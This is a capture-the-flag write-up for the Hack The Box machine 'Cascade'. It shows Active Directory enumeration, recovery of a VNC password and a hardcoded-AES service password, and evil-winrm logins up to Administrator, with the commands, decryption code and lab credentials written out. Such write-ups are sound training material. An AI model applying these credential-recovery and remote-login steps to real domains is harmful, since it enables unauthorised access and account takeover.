---
layout: post
title: "HTB: Cascade"
tags: htb windows
---
Cascade was a mind-blowing box that involved no exploits and had all to do with studious enumeration. Let's go.

### Recce
Do your usual nmap scan and see that there's nothing much interesting.
```
# Nmap 7.80 scan initiated Mon Apr  6 23:14:13 2020 as: nmap -sC -sV -oN initial.txt -v -Pn cascade.htb
Nmap scan report for cascade.htb (10.10.10.182)
Host is up (0.33s latency).
Not shown: 986 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m07s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-07T06:16:43
|_  start_date: 2020-04-06T06:15:05                                                                     
                                                                                                        
Read data files from: /usr/bin/../share/nmap                                                            
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .          
# Nmap done at Mon Apr  6 23:18:11 2020 -- 1 IP address (1 host up) scanned in 238.27 seconds
```
The ports that stand out are 53 (DNS), 88 (Kerberos), 135/445 (SMB), 389/3268 (LDAP). Let's take a closer look at them.

### Port 445 (SMB)
Do the usual `enum4linux` scan and see that we get a bunch of usernames:
```
 ============================ 
|    Users on cascade.htb    |
 ============================ 
index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull     Name: Adrian Turnbull   Desc: (null)
index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc    Desc: (null)
index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson       Name: Ben Hanson        Desc: (null)
index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc      Name: BackupSvc Desc: (null)
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest      Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman       Name: David Burman      Desc: (null)
index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe        Name: Edward Crowe      Desc: (null)
index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft        Name: Ian Croft Desc: (null)
index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen        Name: Joseph Allen      Desc: (null)
index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand     Name: John Goodhand     Desc: (null)
index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield    Name: James Wakefield   Desc: (null)
index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson     Name: Ryan Thompson     Desc: (null)
index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson      Name: Stephanie Hickson Desc: (null)
index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith        Name: Steve Smith       Desc: (null)
index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util   Name: Util      Desc: (null)
```
We can save those usernames - they will come in handy since there's Kerberos and LDAP on the box. Prepare a list of usernames like this:
```
CascGuest
arksvc
s.smith
r.thompson
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
util
```
### Port 88 (Kerberos)
Now we could try seeing if we can do AS-REP roasting attacks with just the usernames with `impacket`'s `GetNPUsers.py` module:
```
python GetNPUsers.py CASCADE/ -usersfile ~/htb/cascade/enum/users -format hashcat -output ~/htb/cascade/hashes.asperoast -dc-ip cascade.htb
Impacket v0.9.22.dev1 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```
We see that didn't work. Let's move on to LDAP and see if we can glean any information from the users' properties.

### Port 189 (LDAP)
Now at this part we can take a leaf out of IppSec's book from his [Ypuffy video to conduct LDAP enumeration](https://www.youtube.com/watch?v=UoB-J-eDvrg):
```
ldapsearch -x -h cascade.htb -s sub -b 'DC=cascade,DC=local' > ldap3
```
Then `grep` the output for key words like `PWD`:
```
less ldap3 | grep Pwd
maxPwdAge: -9223372036854775808
minPwdAge: 0
minPwdLength: 5
badPwdCount: 0
maxPwdAge: -37108517437440
minPwdAge: 0
minPwdLength: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
cascadeLegacyPwd: clk0bjVldmE=
```
Well, whaddayaknow, we got ourselves a password :)

### SMB shares as r.thompson
Take a closer look at our `ldap3` output and see that the password belongs to `r.thompson`. But first, notice that it's encoded in Base64, so decode it:
```
$ echo "clk0bjVldmE=" | base64 -d
rY4n5eva
```
Now we got the plaintext password, let's try to access SMB shares as `r.thompson`:
```
$ smbmap -H cascade.htb -u 'r.thompson' -p 'rY4n5eva'
[+] IP: cascade.htb:445 Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```
Now at this point, it helps to recall some details about `r.thompson`. If we looked back at the `enum4linux` results and `grep`'ed for `r.thompson`, we'll see that `r.thompson` is a member of the `IT` group:
```
$ cat initial.txt | grep r.thompson
index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson     Name: Ryan Thompson     Desc: (null)
user:[r.thompson] rid:[0x455]
Group 'IT' (RID: 1113) has member: CASCADE\r.thompson
Group 'Domain Users' (RID: 513) has member: CASCADE\r.thompson
```
Armed with that knowledge, let's check out the `Data` share:
```
$ smbmap -H cascade.htb -u 'r.thompson' -p 'rY4n5eva' -R 'Data'
[+] IP: cascade.htb:445 Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Data                                                    READ ONLY
        .\Data\*
        dr--r--r--                0 Tue Jan 28 14:05:51 2020    .
        dr--r--r--                0 Tue Jan 28 14:05:51 2020    ..
        dr--r--r--                0 Sun Jan 12 17:45:14 2020    Contractors
        dr--r--r--                0 Sun Jan 12 17:45:10 2020    Finance
        dr--r--r--                0 Tue Jan 28 10:04:51 2020    IT
        dr--r--r--                0 Sun Jan 12 17:45:20 2020    Production
        dr--r--r--                0 Sun Jan 12 17:45:16 2020    Temps
        .\Data\IT\*
        dr--r--r--                0 Tue Jan 28 10:04:51 2020    .
        dr--r--r--                0 Tue Jan 28 10:04:51 2020    ..
        dr--r--r--                0 Tue Jan 28 10:00:30 2020    Email Archives
        dr--r--r--                0 Tue Jan 28 10:04:51 2020    LogonAudit
        dr--r--r--                0 Tue Jan 28 16:53:04 2020    Logs
        dr--r--r--                0 Tue Jan 28 14:06:59 2020    Temp
        .\Data\IT\Email Archives\*
        dr--r--r--                0 Tue Jan 28 10:00:30 2020    .
        dr--r--r--                0 Tue Jan 28 10:00:30 2020    ..
        fr--r--r--             2522 Tue Jan 28 10:00:30 2020    Meeting_Notes_June_2018.html
        .\Data\IT\Logs\*
        dr--r--r--                0 Tue Jan 28 16:53:04 2020    .
        dr--r--r--                0 Tue Jan 28 16:53:04 2020    ..
        dr--r--r--                0 Tue Jan 28 16:53:04 2020    Ark AD Recycle Bin
        dr--r--r--                0 Tue Jan 28 16:56:00 2020    DCs
        .\Data\IT\Logs\Ark AD Recycle Bin\*
        dr--r--r--                0 Tue Jan 28 16:53:04 2020    .
        dr--r--r--                0 Tue Jan 28 16:53:04 2020    ..
        fr--r--r--             1303 Tue Jan 28 17:19:11 2020    ArkAdRecycleBin.log
        .\Data\IT\Logs\DCs\*
        dr--r--r--                0 Tue Jan 28 16:56:00 2020    .
        dr--r--r--                0 Tue Jan 28 16:56:00 2020    ..
        fr--r--r--             5967 Sun Jan 26 14:22:05 2020    dcdiag.log
        .\Data\IT\Temp\*
        dr--r--r--                0 Tue Jan 28 14:06:59 2020    .
        dr--r--r--                0 Tue Jan 28 14:06:59 2020    ..
        dr--r--r--                0 Tue Jan 28 14:06:55 2020    r.thompson
        dr--r--r--                0 Tue Jan 28 12:00:05 2020    s.smith
        .\Data\IT\Temp\s.smith\*
        dr--r--r--                0 Tue Jan 28 12:00:05 2020    .
        dr--r--r--                0 Tue Jan 28 12:00:05 2020    ..
        fr--r--r--             2680 Tue Jan 28 12:00:01 2020    VNC Install.reg
```
Seems like `r.thompson` can only read files from the `IT` folder in the `Data` share, as is consistent with his being part of the `IT` group. Seems like a few files to look at, so let's use `smbget` to download them all in one shot:
```
$ smbget -R smb://cascade.htb/Data/IT -U r.thompson%rY4n5eva
Using workgroup WORKGROUP, user r.thompson
smb://cascade.htb/Data/IT/Email Archives/Meeting_Notes_June_2018.html                                   
smb://cascade.htb/Data/IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log                                   
smb://cascade.htb/Data/IT/Logs/DCs/dcdiag.log                                                           
smb://cascade.htb/Data/IT/Temp/s.smith/VNC Install.reg                                                  
Downloaded 12.18kB in 28 seconds
```
Take a look at all them, and see that the `VNC Install.reg` files is the most interesting...
```
$ cat VNC\ Install.reg 
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
[...]
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
[...]
"VideoClasses"=""
"VideoRects"=""
```
See it?? We got ourselves a password encrypted in hexademical form. We can refer to [this guide on VNC password encryption](https://github.com/frizb/PasswordDecrypts) to decrypt the password:
```
$ msfconsole
msf5 > irb
[*] Starting IRB shell...                                                                               
[*] You are in the "framework" object
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\u0017Rk\u0006#NX\a"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
```
Recall that the `VNC Install.reg` file was in the `IT/Temp/s.smith` folder, so it probably belongs to `s.smith`, which would imply that we've got `s.smith`'s password :)

### Shell as s.smith
Check `enum4linux` output for `s.smith` and see that `s.smith` belongs to the `Remote Management Users` group:
```
$ cat initial.txt | grep s.smith
index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith        Name: Steve Smith       Desc: (null)
user:[s.smith] rid:[0x453]
Group 'IT' (RID: 1113) has member: CASCADE\s.smith
Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith
Group 'Audit Share' (RID: 1137) has member: CASCADE\s.smith
Group 'Domain Users' (RID: 513) has member: CASCADE\s.smith
```
Which means we can probably login via WinRM as `s.smith`...
```
$ evil-winrm -i cascade.htb -u s.smith -p sT333ve2

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents>
```
We can! Grab user.txt here :)

### Digging deeper as s.smith
There's lots of things to check out as `s.smith` - run your usual winPEAS.exe or what not. Having done the box already, let's just say we should always begin by enumerating the user's privileges:
```
*Evil-WinRM* PS C:\Users\s.smith\Documents> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs                                                                                                           
User profile                                                                                                                                             
Home directory                                                                                                                                           
Last logon                   1/29/2020 12:26:39 AM                                                                                                       
                                                                                                                                                         
Logon hours allowed          All                                                                                                                         
                                                                                                                                                         
Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
Interesting - we see that `s.smith` is part of the `Audit Share` group, which if nothing else, is _new_. There's also a `Logon script` for `MapAuditDrive.vbs` associated with this guy, so take note of that. For now, let's go check out `Audit Share` at SMB:
```
$ smbclient -L cascade.htb -U s.smith%sT333ve2

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk      
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share
```
Great, so an `Audit$` share exists when listing shares ... actually if you recall, we've already seen this earlier. But now that we're `s.smith`, we can enter the share and check it out:
```
smbclient \\\\cascade.htb\\Audit$ -U s.smith%sT333ve2
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 29 10:01:26 2020
  ..                                  D        0  Wed Jan 29 10:01:26 2020
  CascAudit.exe                       A    13312  Tue Jan 28 13:46:51 2020
  CascCrypto.dll                      A    12288  Wed Jan 29 10:00:20 2020
  DB                                  D        0  Tue Jan 28 13:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 15:29:47 2020
  System.Data.SQLite.dll              A   363520  Sat Oct 26 23:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sat Oct 26 23:38:38 2019
  x64                                 D        0  Sun Jan 26 14:25:27 2020
  x86                                 D        0  Sun Jan 26 14:25:27 2020

                13106687 blocks of size 4096. 7795037 blocks available
```
Right off the bat we see a few interesting files already - `CascAudit.exe` and `CascCrypto.exe` - simply because they're unusual and contain the word "crypto". Let's download them all:
```
$ smbget -R smb://cascade.htb/Audit$ -U s.smith%sT333ve2
Using workgroup WORKGROUP, user s.smith
smb://cascade.htb/Audit$/CascAudit.exe                                                                                                                   
smb://cascade.htb/Audit$/CascCrypto.dll                                                                                                                  
smb://cascade.htb/Audit$/DB/Audit.db                                                                                                                     
smb://cascade.htb/Audit$/RunAudit.bat                                                                                                                    
smb://cascade.htb/Audit$/System.Data.SQLite.dll                                                                                                          
smb://cascade.htb/Audit$/System.Data.SQLite.EF6.dll                                                                                                      
smb://cascade.htb/Audit$/x64/SQLite.Interop.dll                                                                                                          
smb://cascade.htb/Audit$/x86/SQLite.Interop.dll                                                                                                          
Downloaded 3.33MB in 52 seconds
```
..and look inside all the readable files...(only `RunAudit.bat` here is readable):
```
$ cat RunAudit.bat 
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```
So `CascAudit.exe` simply performs some things `Audit.db`. Great. We can see that `Audit.db` is probalby an `SQLite` file, so let's take a look inside using `SQLite`:
```
$ sqlite3 Audit.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .databases
main: /home/kali/htb/cascade/smb/s.smith.smb.audit/Audit.db

sqlite> .tables
DeletedUserAudit  Ldap              Misc  

sqlite> select * from DeletedUserAudit;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
sqlite>
```
Interesting! First we saw that there're three tables `DeletedUserAudit`, `Ldap`, and `Misc`. Looking inside `DeletedUserAudit` showed us the accounts that were presumably deleted during an IT audit - most notably, `TempAdmin`. We keep this knowledge and continue exploring:
```
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```
We find in the `Ldap` table what looks like encrypted credentials for the `ArkSvc` user. At first glance it looks like it's Base64 encoded, but try to decode it with Base64 and we see that it's actually not. Now at this stage, we can suspect that perhaps `CascAudit.exe` has something to do with the encryption, given that there was also a `CascCrypto.dll` in the `Audit` share.

### Reversing CascAudit.exe and CascCrypto.dll for fun and profit
Unfortunately, from here we have to use Windows a little (at least I did). First, we install [JetBrain's free DotPeek decompiler](https://www.jetbrains.com/decompiler/) in order to decompile `CascAudit.exe`. Once that's done, use `DotPeek` to open `CascAudit.exe` and navigate to `CascAudit` > `CascAudiot` > `MainModule` > `Main():void` like this:

<insert image>

Then, let's zoom in to the following code:
```csharp
using (SQLiteCommand sqLiteCommand = new SQLiteCommand("SELECT * FROM LDAP", connection))
            {
              using (SQLiteDataReader sqLiteDataReader = sqLiteCommand.ExecuteReader())
              {
                sqLiteDataReader.Read();
                empty1 = Conversions.ToString(sqLiteDataReader["Uname"]);
                empty2 = Conversions.ToString(sqLiteDataReader["Domain"]);
                string EncryptedString = Conversions.ToString(sqLiteDataReader["Pwd"]);
                try
                {
                  str = Crypto.DecryptString(EncryptedString, "c4scadek3y654321");
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  Console.WriteLine("Error decrypting password: " + ex.Message);
                  ProjectData.ClearProjectError();
                  return;
                }
              }
            }
```
We see that `CascAudit.exe` essentially does the following:
- 1. Run query "`SELECT * FROM LDAP`";
- 2. Takes out the encrypted string from the `Pwd` field which is most likely the hash `BQO5l5Kj9MdErXx6Q6AGOw==` that we'd seen earlier;
- 3. Decrypt the encrypted string using `Crypto.DecryptString` with `c4scadek3y654321` as the key.
  
  
Take a look inside `CascCrypto.dll` and see that the `DecryptString` function is defined as such:
```csharp
 public static string DecryptString(string EncryptedString, string Key)
    {
      byte[] buffer = Convert.FromBase64String(EncryptedString);
      Aes aes = Aes.Create();
      ((SymmetricAlgorithm) aes).KeySize = 128;
      ((SymmetricAlgorithm) aes).BlockSize = 128;
      ((SymmetricAlgorithm) aes).IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
      ((SymmetricAlgorithm) aes).Mode = CipherMode.CBC;
      ((SymmetricAlgorithm) aes).Key = Encoding.UTF8.GetBytes(Key);
      using (MemoryStream memoryStream = new MemoryStream(buffer))
      {
        using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, ((SymmetricAlgorithm) aes).CreateDecryptor(), CryptoStreamMode.Read))
        {
          byte[] numArray = new byte[checked (buffer.Length - 1 + 1)];
          cryptoStream.Read(numArray, 0, numArray.Length);
          return Encoding.UTF8.GetString(numArray);
        }
      }
    }
```
Seems like a lot to take in, but now we've got all that we need to decrypt `ArkSvc`'s password! Let's write some makeshift `C#` code (we knew it was `C#` because the main file was called `MainModule.cs`!) to make use of the code we found! My hack attempt:
```
cat decrypt.cs 
using System;
//using CascCrypto;
using System.IO;
using System.Security.Cryptography;
using System.Text;

class HelloWorld {
  static void Main() {
    string str = string.Empty;
    //Console.WriteLine("Hello World!");
    string Pwd = "BQO5l5Kj9MdErXx6Q6AGOw==";
    string EncryptedString = Pwd;
    str = DecryptString(EncryptedString, "c4scadek3y654321");
    Console.WriteLine(str);
  }
  public static string DecryptString(string EncryptedString, string Key)
  {
     byte[] buffer = Convert.FromBase64String(EncryptedString);
     Aes aes = Aes.Create();
     ((SymmetricAlgorithm) aes).KeySize = 128;
     ((SymmetricAlgorithm) aes).BlockSize = 128;
     ((SymmetricAlgorithm) aes).IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
     ((SymmetricAlgorithm) aes).Mode = CipherMode.CBC;
     ((SymmetricAlgorithm) aes).Key = Encoding.UTF8.GetBytes(Key);
     using (MemoryStream memoryStream = new MemoryStream(buffer))
     {
       using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, ((SymmetricAlgorithm) aes).CreateDecryptor(), CryptoStreamMode.Read))
       {
         byte[] numArray = new byte[checked (buffer.Length - 1 + 1)];
         cryptoStream.Read(numArray, 0, numArray.Length);
         return Encoding.UTF8.GetString(numArray);
       }
     }
   }
}
```
My hackish attempt basically does the following:
- 1. Copy the entire `DecryptString` function from `CascCrypto.dll` over to my script;
- 2. Call the `DecryptString` function on the hash `BQO5l5Kj9MdErXx6Q6AGOw==` with the key `c4scadek3y654321`.
  
  
Back on Kali, use `mono` to compile and run our `C#` code:
```
$ mcs -out:decrypt.exe decrypt.cs 
kali@kali:~/htb/cascade/smb/test-cs$ mono decrypt.exe 
w3lc0meFr31nd
```
Thank you for the welcome :)

### Shell as ArkSvc
See that the `ArkSvc` user is also part of the `Remote Management Users` group so we can login:
```
cat initial.txt | grep -i "remote"
group:[Remote Desktop Users] rid:[0x22b]
group:[WinRMRemoteWMIUsers__] rid:[0x465]
group:[Remote Management Users] rid:[0x466]
Group 'Remote Management Users' (RID: 1126) has member: CASCADE\arksvc
Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith
```
Yep.
```
$ evil-winrm -i cascade.htb -u arksvc -p w3lc0meFr31nd

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents>
```
As we did earlier with `s.smith`, now let's do the same thing and check out the properties of our new friend `ArkSvc`:
```
*Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
Wa-hey! This user's part of the `AD Recycle Bin` group! Which means we can access the properties of deleted AD users! Remember earlier that we had found a deleted user called `TempAdmin` - now we can inspect that user more closely.
  
  
Now I must say that at this point, there is a [possibility to 'revive' a deleted user](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/) since we're part of the `AD Recycle Bin` group, but we quickly see that we can't do it:
```
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Filter {DisplayName -like 'TempAdmin'} -IncludeDeletedObjects | Restore-ADObject -NewName "NewAdmin"
Insufficient access rights to perform the operation
At line:1 char:79
+ ... Admin'} -IncludeDeletedObjects | Restore-ADObject -NewName "NewAdmin"
+                                      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException
    + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject
```
We have no permissions to revive `TempAdmin` into `NewAdmin` :(
  
  
But no matter! As we have been doing for all the new users we've discovered on this box, let's first check out `TempAdmin`'s properties:
```
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Filter {DisplayName -like 'TempAdmin'} -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```
Wa-hey!! Look at that! `cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz`!
  
  
Turns out it's just Base64 encoded, so easily decode it...
```
$ echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles
```
### Shell as Administrator
If box was trying to teach us anything, it's probably that even when IT Audits are performed regularly, bad security practices can still persist and weaken the security posture of an organization. Bad security practices like _using the same password for both TempAdmin and Administrator accounts_.
```
$ evil-winrm -i cascade.htb -u administrator -p baCT3r1aN00dles

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cascade\administrator
```
This has been a wonderful box to do, hope you enjoyed it as much as I did. :)
